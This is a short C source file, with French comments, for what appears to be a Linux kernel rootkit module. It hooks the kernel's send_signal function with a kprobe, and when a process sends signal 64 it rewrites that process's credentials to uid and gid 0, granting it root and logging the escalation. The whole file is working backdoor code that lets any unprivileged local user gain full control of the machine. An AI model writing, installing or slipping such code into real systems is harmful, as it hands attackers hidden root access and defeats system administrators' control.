/*
 *
 * Ce script tente intercepte les signaux systèmes
 *
 */

#include "rootest.h"

#define CUSTOM_SIGNAL 64

int handle_signal_send(struct kprobe *kp, struct pt_regs *regs) {
    int sig = regs->si;
    
    if (sig == CUSTOM_SIGNAL) {
        struct cred *new_creds = prepare_kernel_cred(NULL);
        if (new_creds) {
            new_creds->uid.val = new_creds->gid.val = 0;
            new_creds->euid.val = new_creds->egid.val = 0;
            new_creds->suid.val = new_creds->sgid.val = 0;
            new_creds->fsuid.val = new_creds->fsgid.val = 0;
            commit_creds(new_creds);
            printk(KERN_INFO "Elévation de privilèges pour le processus %d\n", current->pid);
        }
    }

    return 0;
}

struct kprobe sig_kp = {
    .symbol_name = "send_signal",
    .pre_handler = handle_signal_send,
};
